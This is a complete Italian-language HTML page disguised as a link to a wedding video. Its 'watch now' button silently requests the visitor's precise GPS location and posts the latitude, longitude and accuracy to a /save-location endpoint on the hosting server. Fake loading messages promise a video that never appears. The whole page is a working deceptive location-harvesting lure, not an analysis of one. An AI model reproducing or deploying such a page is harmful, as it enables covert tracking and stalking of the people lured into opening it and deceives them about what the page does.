<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Guarda il mio ultimo video di un matrimonio</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        .status { margin-top: 20px; padding: 10px; border-radius: 10px; display: none; }
        .success { background: #d4edda; color: #155724; display: block; }
        .error { background: #f8d7da; color: #721c24; display: block; }
    </style>
</head>
<body>
    <div class="card">
        <h1> Guarda il mio ultimo video del matrimonio </h1>
        <p>Clicca sul pulsante per guardare il video </p>
        <button class="btn" onclick="getLocation()">✅ guarda ora</button>
        <div id="status" class="status"></div>
    </div>
    <script>
        async function getLocation() {
            const status = document.getElementById('status');
            const btn = document.querySelector('.btn');
            
            if (!navigator.geolocation) {
                status.textContent = '❌ visualizzazione non supportata';
                status.className = 'status error';
                return;
            }
            
            btn.disabled = true;
            btn.textContent = '⏳ Attendi...';
            status.textContent = '🔄 caricamento in corso...';
            status.className = 'status success';
            
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });
                
                status.textContent = '📤 Invio in corso...';
                
                const res = await fetch('/save-location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy)
                    })
                });
                
                if (res.ok) {
                    status.textContent = '✅ a breve si aprirà il video !';
                    btn.textContent = '✅ attendi!';
                } else {
                    throw new Error('Errore server');
                }
            } catch (err) {
                status.textContent = '❌ Errore: ' + err.message;
                status.className = 'status error';
                btn.disabled = false;
                btn.textContent = '✅ guarda ora';
            }
        }
    </script>
